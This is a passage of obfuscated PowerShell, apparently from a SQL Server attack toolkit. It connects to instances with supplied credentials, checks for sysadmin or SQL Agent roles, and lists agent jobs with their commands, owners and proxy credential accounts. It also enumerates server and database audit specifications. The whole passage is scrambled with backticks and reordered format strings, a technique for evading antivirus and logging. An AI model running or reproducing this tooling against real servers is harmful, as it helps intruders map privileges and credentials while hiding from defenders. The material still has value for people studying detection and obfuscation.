            ${cON`N`eCtI`oN} = &("{2}{3}{4}{6}{5}{1}{0}"-f'ect','bj','Ge','t-S','QL','onnectionO','C') -Instance ${InsT`AN`CE} -Username ${Us`eRNamE} -Password ${p`A`SSwoRd} -Credential ${cr`e`DEN`TIal} -DAC -TimeOut ${T`IM`eoUt}
        }
        else
        {
            
            ${Conn`EcT`i`On} = &("{1}{2}{3}{5}{4}{0}"-f'ect','Get-SQLConn','e','ctio','bj','nO') -Instance ${I`Ns`TaNCe} -Username ${uSe`Rn`A`mE} -Password ${PA`sswo`Rd} -Credential ${c`ReDeNT`I`Al} -TimeOut ${ti`me`oUT}
        }

        
        try
        {
            
            ${c`onNe`cT`ION}.("{0}{1}" -f'O','pen').Invoke()
            if(-not ${Su`PP`Ressv`eRbo`sE})
            {
                &("{2}{0}{1}" -f'ite-Ver','bose','Wr') -Message ("$Instance "+': '+'Connec'+'ti'+'on '+'S'+'ucces'+'s.')                
            }

            
            ${S`eRv`eRin`Fo} = &("{3}{0}{1}{2}" -f 'erv','erInf','o','Get-SQLS') -Instance ${iN`ST`AN`CE} -Username ${us`e`RnaME} -Password ${p`ASs`woRd} -Credential ${cRedent`I`Al} -SuppressVerbose
            ${Cur`ReNt`LOG`In} = ${SE`RV`er`inFO}."CUR`REn`TL`oGIn"
            ${CoMPUtERn`A`me} = ${sERV`erI`Nfo}."C`o`mPUtER`NAme"
            ${S`ysA`dM`IN} = ${sER`V`erI`NFo}."IsS`ySAdm`iN"

            
            ${I`S`Ag`eN`TSE`Rvic`eeNAblED} = &("{1}{2}{0}{3}"-f'er','Get','-SQLQu','y') -Instance ${I`N`STAnCe} -Query ((("{6}{10}{8}{5}{0}{1}{2}{9}{4}{7}{3}" -f' ','LEFT(','program_name, 8) =','0}','SQ','ses WHERE','SELECT 1 FR','LAgent{','es',' {0}','OM sysproc')) -f[Char]39) -Username ${USer`NaMe} -Password ${paS`Sw`ORd} -SuppressVerbose
            if (${I`sa`GEntSErV`Iceenab`Led})
            {
                if(-not ${SU`ppREs`svE`R`BOSE}){
                    &("{1}{2}{0}" -f'se','Write-Ve','rbo') -Message ("$Instance "+': '+'- '+'SQL'+' '+'Serv'+'er'+' '+'Agen'+'t '+'s'+'ervice'+' '+'enable'+'d.')
                }
            }
            else
            {
                if(-not ${suPP`REsSVe`RB`OSe}){
                    &("{2}{0}{1}"-f 'o','se','Write-Verb') -Message ("$Instance "+': '+'- '+'SQL'+' '+'Se'+'rve'+'r '+'A'+'ge'+'nt '+'s'+'ervice '+'ha'+'s '+'not'+' '+'b'+'een '+'st'+'arted.')
                }
            }

            
            
            ${A`D`djobpRivs} = &("{3}{0}{1}{6}{2}{4}{5}" -f 't-SQL','Dat','eR','Ge','oleM','ember','abas') -Username ${usEr`Na`me} -Password ${passW`Ord} -Instance ${in`StaN`ce} -DatabaseName ("{1}{0}"-f'db','ms')  -SuppressVerbose| &("{2}{1}{0}" -f't','jec','ForEach-Ob') { 
                if(${_}."ROLePR`iNC`IP`ALN`AmE" -match ((("{10}{5}{11}{8}{6}{1}{3}{4}{9}{0}{7}{2}" -f 'Ope','0','e','}SQLA','ge','{','eaderRole{','ratorRol','AgentR','nt','SQLAgentUserRole','0}SQL'))  -f [chAR]124)) {
                    if (${_}."p`R`i`NCipaLn`AmE" -eq ${CUr`R`ENtLO`GIN}) { ${_} }
                }
            }

            if(${Age`NTj`Obp`RiVS} -or (${SYS`Ad`mIn} -eq "Yes"))
            {
                if(-not ${Sup`Pre`SS`VeRbosE}){
                    &("{0}{1}{2}"-f'Write-','V','erbose') -Message ("$Instance "+': '+'- '+'Att'+'em'+'pt'+'ing '+'to'+' '+'l'+'ist '+'e'+'x'+'isting '+'a'+'gent'+' '+'j'+'obs '+'a'+'s '+"$CurrentLogin.")
                }


                
                ${Q`U`eRy} = ('SEL'+'EC'+'T '+'	s'+'teps.dat'+'abase'+'_'+'na'+'me,'+'
	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'job.j'+'ob_'+'id '+'a'+'s '+'[JO'+'B_I'+'D],
	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'job.n'+'a'+'me'+' '+'as'+' '+'[JOB_NAME'+'],'+'
	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'j'+'ob'+'.descrip'+'tio'+'n '+'as'+' '+'[JO'+'B_DE'+'SC'+'RI'+'PTI'+'O'+'N],
	'+'							'+'SUS'+'ER_SNAME('+'job'+'.o'+'wne'+'r'+'_sid) '+'as'+' '+'[JOB_O'+'WNER'+'],
					'+'			steps'+'.proxy'+'_i'+'d'+',
	'+'		'+'	'+'		'+'	'+'	pro'+'x'+'ies.name '+'as'+' '+'[pro'+'xy_acc'+'ount'+']'+',
	'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'job'+'.e'+'nab'+'led,
	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'steps'+'.'+'s'+'erver,'+'
	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'job.'+'d'+'ate'+'_cre'+'ated, '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'st'+'e'+'ps.l'+'a'+'st_run_date'+',				'+'				 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
						'+'		'+'s'+'teps'+'.'+'step_name,
'+'		'+'						steps.su'+'bsystem,
	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'teps.c'+'o'+'mmand
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FROM'+' '+'[ms'+'db].'+'[d'+'bo].[sysjobs] '+'job
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'INNER'+' '+'JOIN'+' '+'[msdb].[d'+'bo].['+'sysjob'+'steps]'+' '+'ste'+'ps'+' '+' '+' '+' '+' '+' '+' '+' '+'
	'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'jo'+'b.j'+'ob_id'+' '+'= '+'steps'+'.jo'+'b_id'+'
			'+'				le'+'f'+'t '+'join'+' '+'[msdb].[dbo].[sy'+'s'+'prox'+'ies'+'] '+'p'+'roxies'+'
					'+'		'+' '+'o'+'n '+'steps.pro'+'xy'+'_id '+'= '+'p'+'roxi'+'es'+'.pro'+'xy_id'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WH'+'ERE '+'1=1'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$KeywordFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SubSystemFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$ProxyCredFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$UsingProxyCredFilter")

                
                ${R`eSULt} = &("{0}{1}{2}"-f 'Get-SQ','LQuer','y') -Instance ${insT`An`cE} -Query ${Q`UErY} -Username ${UseR`N`AmE} -Password ${p`A`SsWORd} -SuppressVerbose
                
                
                if(!(${R`eSU`lT})) {
                    &("{4}{0}{3}{1}{2}"-f't','erbo','se','e-V','Wri') -Message ("$Instance "+': '+'- '+'Eith'+'er '+'no'+' '+'jobs'+' '+'exis'+'t '+'o'+'r '+'th'+'e '+'cu'+'rr'+'ent '+'login'+' '+"($CurrentLogin) "+('d'+'oesn{0'+'}t'+' ') -F[ChAR]39+'h'+'ave '+'the'+' '+'pri'+'vileg'+'e'+'s '+'to'+' '+'vi'+'ew '+'the'+'m.')
                    return
                }

                
                ${AgeN`TJ`o`BCoUNT} = ${r`EsULT}."ro`Ws"."cOu`NT"
                if(-not ${su`pPrE`SSV`erB`OSE}){
                    &("{2}{1}{0}" -f 'Verbose','e-','Writ') -Message ("$Instance "+': '+'- '+"$AgentJobCount "+'ag'+'ent'+' '+'j'+'obs '+'fo'+'und'+'.')
                }
                

                
                ${R`esUlT} | 
                &("{3}{2}{4}{0}{1}"-f'bjec','t','rEa','Fo','ch-O'){
                    ${n`ULl} = ${TBlr`E`suLTs}."rO`Ws".("{1}{0}"-f 'd','Ad').Invoke(${cOmpU`TERn`Ame},
                    ${InsT`AN`cE},
                    ${_}."daT`AbaS`E_n`Ame",                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
                    ${_}."joB_`ID",                                                                                                                                                                                        
                    ${_}."j`Ob_n`AME", 
                    ${_}."jO`B_des`crIP`TION",                                                                                                                                                                                                         
                    ${_}."J`o`B_OWnER",
                    ${_}."P`R`Oxy_Id",    
                    ${_}."pR`oxy_A`CCOu`Nt", 
                    ${_}."DATe_`cR`EateD",
                    ${_}."lasT`_R`Un_`Date",                                                                                                                                                                                  
                    ${_}."E`NaB`LeD",                                                                                                                                                                                                     
                    ${_}."Ser`VEr",                                                                                                                                                                                        
                    ${_}."s`TEP_`Name",
                    ${_}."s`UbsySTem",
                    ${_}."coM`mAnd")
                }
            }
            else
            {
                if(-not ${S`UppREss`Ve`RBose}){
                    &("{3}{2}{0}{1}{4}"-f 'it','e-Verbos','r','W','e') -Message ("$Instance "+': '+'- '+'Th'+'e '+'cur'+'rent '+'login'+' '+"($CurrentLogin) "+'does'+' '+'not'+' '+'have'+' '+'a'+'ny '+'agent'+' '+'priv'+'i'+'leges.')
                }
                return
            }

            
            ${cO`Nn`eC`TIon}.("{1}{0}" -f'lose','C').Invoke()

            
            ${cOn`N`ECTioN}.("{0}{2}{1}"-f 'Disp','se','o').Invoke()

        }
        catch
        {
            
            if(-not ${SUPPRE`ssv`E`RboSE})
            {
                ${Er`RoRmE`SSa`ge} = ${_}."e`xCEp`TIOn"."Me`sSaGe"
                &("{1}{0}{3}{2}" -f'te-Ve','Wri','e','rbos') -Message ("$Instance "+': '+'Connect'+'i'+'on '+'Fa'+'i'+'led.')
                
            }
        }        
    }

    End
    {
        if(-not ${S`UPPr`eSS`VerB`OSe}){
            &("{3}{0}{1}{2}"-f'-V','erbo','se','Write') -Message ("{8}{7}{2}{6}{3}{1}{0}{5}{4}{9}"-f' Job S','nt',' ','e',' Co','earch','Ag','rver','SQL Se','mplete.')
        }

        
        ${T`Ot`Al`AGe`NTcOUNt} = ${tBlrE`s`UlTs}."rO`WS"."c`OunT"

        
        ${s`UMma`R`YSu`BSySt`em} = ${TblRes`U`LTS} | &("{0}{2}{1}{3}" -f 'Gr','jec','oup-Ob','t') ("{2}{1}{0}"-f 'ystem','ubS','S') | &("{2}{0}{1}"-f 'c','t','Sele') ("{1}{0}"-f 'ame','N'), ("{1}{0}"-f't','Coun') | &("{2}{0}{1}"-f't-Ob','ject','Sor') ("{1}{0}"-f 'unt','Co') -Descending

        
        ${SummAR`ypRo`xYa`C`C`OUnt} = ${T`Bl`Re`suLtS} | &("{0}{3}{2}{1}"-f 'Sele','bject','t-O','c') ("{1}{4}{5}{2}{3}{0}" -f'ial','p','e','dent','roxy_','cr') -Unique | &("{1}{0}{2}{3}"-f 'ea','M','sure-','Object') | &("{1}{3}{4}{0}{2}" -f 't-','S','Object','el','ec') ("{1}{0}" -f 't','Coun') -ExpandProperty ("{1}{0}"-f'ount','C')

        
        ${s`U`MMa`RYSER`VeR} = ${TBLRe`S`Ults} | &("{0}{2}{1}"-f 'S','bject','elect-O') ("{1}{3}{2}{0}" -f 'ame','Co','erN','mput') -Unique | &("{0}{3}{2}{1}"-f'Measure','t','c','-Obje') |  &("{1}{2}{0}{4}{3}" -f 'ct-Ob','S','ele','t','jec') ("{1}{0}" -f'ount','C') -ExpandProperty ("{1}{0}"-f'ount','C')

        
        ${sU`MM`Ary`In`sTancE} = ${tb`lR`eS`Ults} | &("{0}{2}{1}"-f'S','Object','elect-') ("{0}{1}"-f 'Instan','ce') -Unique | &("{1}{2}{3}{0}{4}"-f're-Obje','M','e','asu','ct') |  &("{0}{1}{4}{3}{2}" -f 'Se','le','t','bjec','ct-O') ("{1}{0}" -f 'ount','C') -ExpandProperty ("{1}{0}"-f't','Coun')

        if(-not ${su`pp`Re`SSveR`BosE}){
            &("{1}{0}{2}" -f'erbo','Write-V','se') -Message ("{2}{8}{5}{6}{1}{3}{10}{4}{9}{7}{0}" -f'-----','-','-','----','-','--','-','----','---------','---','--')
            &("{0}{2}{4}{3}{1}"-f'Wri','se','te-','o','Verb') -Message ("{0}{2}{4}{1}{3}"-f 'Agent ',' Sum','Jo','mary','b') 
            &("{0}{3}{1}{2}"-f'Wr','e','rbose','ite-V') -Message ("{5}{1}{0}{2}{3}{6}{4}"-f'----------------','--','--','------','---','---','-')
            &("{4}{3}{0}{2}{1}" -f'te-','rbose','Ve','ri','W') -Message (' '+"$TotalAgentCount "+'j'+'obs '+'foun'+'d')
            &("{0}{2}{1}{3}"-f 'Wr','e-Ve','it','rbose') -Message (' '+"$SummaryServer "+'affe'+'cte'+'d '+'sys'+'tem'+'s')
            &("{0}{3}{1}{2}"-f'W','erbos','e','rite-V') -Message (' '+"$SummaryInstance "+'affec'+'ted '+'S'+'QL '+'Serv'+'e'+'r '+'in'+'st'+'an'+'ces')
            &("{1}{0}{2}" -f'e-Verbos','Writ','e') -Message (' '+"$SummaryProxyAccount "+'pr'+'o'+'xy '+'crede'+'n'+'tials '+'use'+'d')

            &("{1}{4}{0}{2}{3}" -f'-V','Writ','erb','ose','e') -Message ("{0}{1}{3}{2}{5}{4}"-f'-','----','-----','--------','-','--------------')
            &("{1}{3}{0}{2}" -f 'er','W','bose','rite-V') -Message ("{4}{3}{1}{2}{0}{5}" -f 'b','by ','Su','nt Job Summary ','Age','System') 
            &("{0}{3}{4}{1}{2}"-f'W','er','bose','ri','te-V') -Message ("{2}{6}{4}{5}{0}{3}{7}{1}" -f'-----','---','----','--','----','---','---------','---')
            ${suMmARysUbSY`s`T`em} | 
            &("{1}{4}{2}{0}{3}" -f 'h-Ob','For','ac','ject','E') {
                ${subsy`STEm_N`Ame} = ${_}."na`Me"
                ${su`B`S`YSteM_COUNT} = ${_}."cOU`NT"
                &("{3}{4}{1}{0}{2}" -f'rbos','te-Ve','e','Wr','i') -Message (' '+"$SubSystem_Count "+"$SubSystem_Name "+'Jo'+'bs')
            }
            &("{1}{2}{0}{3}"-f'erbo','Wr','ite-V','se') -Message (' '+"$TotalAgentCount "+'Tota'+'l')
            &("{3}{2}{0}{1}"-f '-Verbo','se','ite','Wr') -Message ("{5}{7}{2}{6}{0}{8}{4}{1}{3}" -f'---','---','---','---','---','------------','--','-','---')
        }

        
        ${T`BlrESu`lTs}
    }
}





Function  gE`T-sqlaU`Dit`da`TAb`Ases`PeC
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANdatOrY = ${fAL`SE},
        hELPMeSSAGe = {"{6}{5}{0}{11}{12}{7}{13}{8}{9}{4}{2}{1}{3}{10}"-f 'oma','it','te w','h','entica',' or d','SQL Server','c','o a','uth','.','in ','a','count t'})]
        [string]${US`ErNa`ME},

        [Parameter(mAndaTOry = ${f`ALsE},
        HELpMEsSAge = {"{11}{2}{14}{10}{3}{13}{15}{9}{6}{1}{4}{5}{7}{12}{8}{0}" -f 'h.',' authe',' Se',' or domain a','nt','ic','ord to','at','t','sw','ver','SQL','e wi','cc','r','ount pas'})]
        [string]${PAsS`wOrD},

        [Parameter(mANDaToRY = ${f`AL`Se},
        helpMEsSage = {"{3}{4}{2}{0}{1}"-f'ls','.','ntia','Windows',' crede'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRE`D`ENtial} =  (  VaRiaBle  0459M2 ).VAlue::"EmP`TY",

        [Parameter(MAndATorY = ${Fa`l`Se},
                ValuefROMPIpelInEbYpRoperTyNAMe = ${T`RUE},
        HelpMessaGe = {"{6}{4}{3}{9}{2}{5}{0}{1}{7}{8}" -f'n','e','ce to','ve','Ser',' con','SQL ','ctio','n to.','r instan'})]
        [string]${in`s`T`AnCe},

        [Parameter(mANDATorY = ${f`ALSE},
                VAlUEfROMpIpeLInEbyPrOpeRtyNAME = ${TR`UE},
        heLpMeSSAGE = {"{3}{0}{1}{2}"-f 'i','t n','ame.','Aud'})]
        [string]${au`d`itNAMe},

        [Parameter(mAndATORy = ${F`A`LsE},
                VALuEfrOmpIPeLiNebYPRopErTynAMe = ${tr`Ue},
        hElpMesSage = {"{1}{3}{0}{2}"-f ' n','Specif','ame.','ication'})]
        [string]${A`U`diTs`P`ec`IFiCATioN},

        [Parameter(maNdaTORy = ${F`ALsE},
                vaLUEfromPipELinEByPROpERTynAMe = ${t`RuE},
        HElpMessAgE = {"{0}{3}{1}{2}" -f 'Aud','ac','tion name.','it '})]
        [string]${AUdiTa`C`TIOn},



        [Parameter(MANDatORy = ${f`A`lSe},
        HELPmeSsagE = {"{7}{0}{6}{11}{5}{2}{13}{12}{3}{9}{1}{10}{14}{4}{8}" -f 's v','n ','ror',' wh','is wr','er','erb','Suppres','apped.','e','functio','ose ','  Used','s.','n '})]
        [switch]${sU`ppREsS`V`ErBose}
    )

    Begin
    {
        
        ${t`Bl`AUDIT`da`TAbASesP`Ec} = &("{0}{2}{3}{1}"-f 'Ne','t','w-Ob','jec') -TypeName ("{3}{0}{4}{1}{2}"-f 'stem.Data.Dat','a','ble','Sy','aT')

        
        if(${auD`I`T`NaME})
        {
            ${auDi`TnaMEFi`l`TeR} = (' '+'an'+'d '+'a.n'+'a'+'me '+'lik'+'e '+"'%$AuditName%'")
        }
        else
        {
            ${A`U`diT`NAMEfilTEr} = ''
        }

        
        if(${au`dI`TspECiF`iCatIOn})
        {
            ${SpecNAmEf`ILt`ER} = (' '+'and'+' '+'s.na'+'me '+'like'+' '+"'%$AuditSpecification%'")
        }
        else
        {
            ${sPeCna`MEF`i`Lter} = ''
        }

        
        if(${aUDi`Tact`iOn})
        {
            ${aCTio`NNamEFIL`T`Er} = (' '+'an'+'d '+'d'+'.'+'au'+'di'+'t_acti'+'on_name '+'lik'+'e '+"'%$AuditAction%'")
        }
        else
        {
            ${acTiON`Na`me`FilT`eR} = ''
        }
    }

    Process
    {
        

        
        ${CoMPuT`erNa`me} = &("{2}{7}{3}{4}{0}{5}{1}{6}"-f 'erName','Instan','Ge','omp','ut','From','ce','t-C') -Instance ${ins`TA`NCe}

        
        if(-not ${iNS`Tan`ce})
        {
            ${inSTA`N`CE} = ${E`NV:co`MputErN`AMe}
        }


        
        ${tESt`cOn`Ne`CTiON} = &("{0}{3}{4}{2}{5}{1}" -f'Get-S','t','tionT','QLConne','c','es') -Instance ${IN`STAnCE} -Username ${UsErN`Ame} -Password ${PaS`s`WOrD} -Credential ${CRED`e`Nt`iAl} -SuppressVerbose | &("{0}{1}{2}"-f'Whe','re-Obj','ect') -FilterScript {
            ${_}."sta`TUs" -eq ("{1}{0}{2}"-f'b','Accessi','le')
        }
        if(${t`Es`TC`oNNECT`iOn})
        {
            if( -not ${su`p`PR`esSVeR`BoSe})
            {
                &("{2}{3}{0}{1}" -f 'rb','ose','Wr','ite-Ve') -Message ("$Instance "+': '+'Co'+'nne'+'ction '+'Succ'+'ess.')
            }
        }
        else
        {
            if( -not ${su`P`PReS`SverbOsE})
            {
                &("{0}{4}{1}{3}{2}" -f 'Wr','e','e','-Verbos','it') -Message ("$Instance "+': '+'Connec'+'tio'+'n'+' '+'F'+'a'+'iled.')
            }
            return
        }


        
        ${qU`E`Ry} = (' '+' '+'S'+'EL'+'ECT '+' '+"'$ComputerName' "+'as'+' '+'['+'Com'+'puterNam'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[In'+'sta'+'nce],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'au'+'d'+'it_id'+' '+'as'+' '+'[Aud'+'itId'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.n'+'ame'+' '+'a'+'s '+'[Au'+'di'+'tName],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.'+'n'+'ame '+'as'+' '+'[AuditS'+'pecifica'+'tion]'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'d.aud'+'it_ac'+'t'+'ion_'+'id '+'a'+'s '+'[AuditAc'+'t'+'ionId'+'],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'d'+'.audit_act'+'ion'+'_nam'+'e '+'as'+' '+'[Aud'+'itA'+'c'+'tion]'+',
	'+' '+' '+' '+' '+' '+' '+' '+' '+'d'+'.major_id,
	'+' '+' '+' '+' '+' '+' '+' '+' '+'OBJEC'+'T_N'+'A'+'ME(d.'+'m'+'ajor_id'+') '+'a'+'s '+'ob'+'ject'+',	
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.is_s'+'tate'+'_enabled'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'d'+'.i'+'s_grou'+'p,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'.c'+'rea'+'te_dat'+'e,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'.modi'+'f'+'y_date,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'d'+'.aud'+'ited_result'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FR'+'OM '+'sy'+'s.server_aud'+'it'+'s '+'AS'+' '+'a
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JO'+'IN '+'sys.database_au'+'d'+'i'+'t_s'+'pec'+'if'+'icat'+'ions'+' '+'AS'+' '+'s'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'a.a'+'u'+'dit_gui'+'d '+'= '+'s.au'+'di'+'t_guid
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'J'+'OIN '+'sys.'+'datab'+'ase_'+'audit_specif'+'icati'+'on_d'+'e'+'tails '+'A'+'S '+'d'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'s.'+'database_'+'spe'+'c'+'i'+'fi'+'cation_id '+'= '+'d.data'+'base_sp'+'ec'+'ificat'+'ion_i'+'d'+' '+'WHERE'+' '+'1=1
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$AuditNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SpecNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+"$ActionNameFilter")

        
        ${TBlRE`SUL`TS} = &("{1}{2}{3}{0}"-f'ery','Ge','t-SQ','LQu') -Instance ${IN`St`AncE} -Query ${q`U`ERY} -Username ${useR`N`Ame} -Password ${P`Ass`W`oRd} -SuppressVerbose

        
        ${tB`lAU`DiTDa`TaBaS`EsP`EC} = ${tbLA`U`ditDatA`BASe`Sp`ec} + ${tBlr`e`SULTs}
    }

    End
    {
        
        ${tbLA`Udi`T`DATAB`ASESP`eC}
    }
}






Function  G`Et-`Sql`A`UdIt`SerVeRspEC
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAndaToRy = ${f`Al`se},
        helpmEssage = {"{5}{9}{3}{8}{6}{7}{4}{2}{0}{1}"-f'en','ticate with.','h','r',' account to aut','SQL','do','main','ver or ',' Se'})]
        [string]${u`Se`RNAMe},

        [Parameter(MaNDaToRY = ${f`A`LSE},
        HeLPmessAGe = {"{5}{0}{9}{4}{3}{8}{2}{1}{7}{6}"-f 'rver or do','ntic','o authe','nt passwor','ccou','SQL Se','te with.','a','d t','main a'})]
        [string]${Pa`ssw`Ord},

        [Parameter(MAnDaTOrY = ${f`A`lSE},
        HElpMeSSaGE = {"{4}{3}{1}{5}{2}{0}"-f 'als.','ws cr','i','do','Win','edent'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${Cr`edEN`T`IaL} =  $0459M2::"eM`PtY",

        [Parameter(MANDaTorY = ${faL`SE},
                vAlueFROMPiPElIneBYPRoPERtYnaME = ${tr`Ue},
        hELPMEssAGe = {"{2}{3}{6}{0}{4}{1}{5}"-f' connect','n ','SQL',' Server instance t','io','to.','o'})]
        [string]${INS`T`ANCe},

        [Parameter(mAndAtorY = ${F`AL`SE},
                vAluefRomPIpeLINebYprOpeRtYnaME = ${tR`UE},
        helPmeSsaGe = {"{0}{3}{1}{2}"-f'A','name','.','udit '})]
        [string]${AUdITn`A`Me},

        [Parameter(ManDatoRY = ${fAL`Se},
                VAlUeFRompipElinEBYPrOPERTYNAME = ${Tr`Ue},
        HELPmEsSagE = {"{4}{3}{0}{1}{2}" -f 'ca','tio','n name.','ifi','Spec'})]
        [string]${A`UDi`TspEc`I`FiCatIon},

        [Parameter(MaNdaTORY = ${F`AlSe},
                vALUefROmPIpELiNEBYPropERTyNAMe = ${Tr`Ue},
        HELPMESsAge = {"{3}{0}{1}{2}"-f 'dit ','action na','me.','Au'})]
        [string]${AUD`ITa`c`TIoN},

        [Parameter(manDATOrY = ${f`ALse},
        HelPmesSAgE = {"{10}{11}{1}{6}{4}{13}{0}{2}{5}{12}{9}{7}{14}{3}{8}"-f 'rror','re','s','e','b','.  Used when fun','ss ver','a','d.','s wr','Su','pp','ction i','ose e','pp'})]
        [switch]${S`UP`prE`Ssv`ERBOSE}
    )

    Begin
    {
        
        ${tb`LAUDI`TS`erv`ErSPec} = &("{2}{1}{0}"-f 'ect','bj','New-O') -TypeName ("{3}{4}{5}{0}{1}{2}"-f'ataT','ab','le','Syste','m.D','ata.D')

        
        if(${au`diT`NaME})
        {
            ${aUd`itn`AmE`F`iLtER} = (' '+'an'+'d '+'a'+'.na'+'me '+'lik'+'e '+"'%$AuditName%'")
        }
        else
        {
            ${au`Di`TN`AMeF`il`TeR} = ''
        }

        
        if(${AUditspECI`Fi`c`A`Ti`ON})
        {
            ${sPeCn`AmE`F`i`Lter} = (' '+'a'+'nd '+'s.'+'name '+'l'+'ike '+"'%$AuditSpecification%'")
        }
        else
        {
            ${sPE`CNAmE`FILtEr} = ''
        }

        
        if(${aU`D`ITaCT`ion})
        {
            ${AC`T`ioNNA`mE`F`iLTEr} = (' '+'and'+' '+'d.audit_ac'+'ti'+'on'+'_name '+'like'+' '+"'%$AuditAction%'")
        }
        else
        {
            ${ACt`I`ONNa`me`FIlteR} = ''
        }
    }

    Process
    {
        

        
        ${C`oMpu`TerNAMe} = &("{0}{2}{1}{3}{6}{4}{5}"-f'Ge','Com','t-','pu','mInst','ance','terNameFro') -Instance ${INStA`N`cE}

        
        if(-not ${I`NS`Tance})
        {
            ${IN`sTA`NCe} = ${e`NV`:COMPUTErn`Ame}
        }

        
        ${TesT`CO`NNeC`TION} = &("{4}{0}{2}{3}{1}{5}" -f't-SQL','tionTes','C','onnec','Ge','t') -Instance ${iN`ST`Ance} -Username ${USeR`N`AmE} -Password ${p`AsswO`RD} -Credential ${C`R`eD`EnTiaL} -SuppressVerbose | &("{1}{0}{2}{3}"-f'-O','Where','bj','ect') -FilterScript {
            ${_}."sTat`US" -eq ("{2}{0}{1}" -f 'ccessi','ble','A')
        }
        if(${TEsT`ConNE`C`Ti`ON})
        {
            if( -not ${sU`PpRess`VErBO`Se})
            {
                &("{2}{3}{1}{0}" -f'se','e-Verbo','Wri','t') -Message ("$Instance "+': '+'C'+'o'+'nn'+'ection '+'Suc'+'cess'+'.')
            }
        }
        else
        {
            if( -not ${S`UP`PRE`ssv`erBoSE})
            {
                &("{1}{2}{0}" -f 'e','Wr','ite-Verbos') -Message ("$Instance "+': '+'C'+'onnect'+'ion '+'Fa'+'iled'+'.')
            }
            return
        }

        
        ${q`Uery} = (' '+' '+'SE'+'LECT '+' '+"'$ComputerName' "+'a'+'s '+'[Compu'+'terNam'+'e]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[I'+'ns'+'tan'+'ce],
